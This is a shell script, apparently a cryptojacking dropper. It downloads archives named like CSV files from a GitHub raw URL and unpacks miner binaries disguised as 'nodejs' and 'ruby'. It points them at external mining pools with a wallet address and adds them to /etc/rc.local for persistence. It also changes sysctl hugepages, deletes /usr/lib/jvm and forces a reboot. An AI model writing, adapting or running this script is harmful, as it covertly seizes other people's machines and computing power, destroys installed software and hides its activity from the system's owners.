#!/bin/sh
cd /home/sshuser
mkdir db1 db2
cd /home/sshuser/db1
wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv44.tar.gz
tar xvzf csv44.tar.gz
cd /home/sshuser/db2
wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv45.tar.gz
tar xvzf csv45.tar.gz
touch a.txt
echo '{
"retry_time" : 600,
"cpu_threads" : 8,
"giveup_limit" : 22,
"algorithm" : "randomepic",
"disable_cpu" : false,
"disable_gpu" : true
}' > a.txt

mkdir Cache Config Logs Pools
cd /home/sshuser
echo vm.nr_hugepages=2432 >> /etc/sysctl.conf

rm -r /home/sshuser/db1/csv44.tar.gz
rm -r /home/sshuser/db1/csv45.tar.gz
rm -r /usr/lib/jvm
ls
echo '
cd /home/sshuser/db1
nice -n 19 ./nodejs -o 139.99.123.101:10110 -u LQgQUcMbPU5VuhuXYnZLiLA7ZiANrJsDdKoUhB4FqYVdeKF1ES9RZWRBLrur2N1LfMQ3CyLh8M5ccdU4VudHPsJv4DjEy6s.15000 -p fn -a rx/loki --donate-level 1 -t 8 -k -B
cd /home/sshuser
sleep 60
cd /home/sshuser/db2
nice -n -20 nohup ./ruby --config-file a.txt --pool 44.234.13.84:8998 --wallet d --password h >/dev/null 2>&1 &
cd /home/sshuser
ls' >> /etc/rc.local
shutdown -r 5
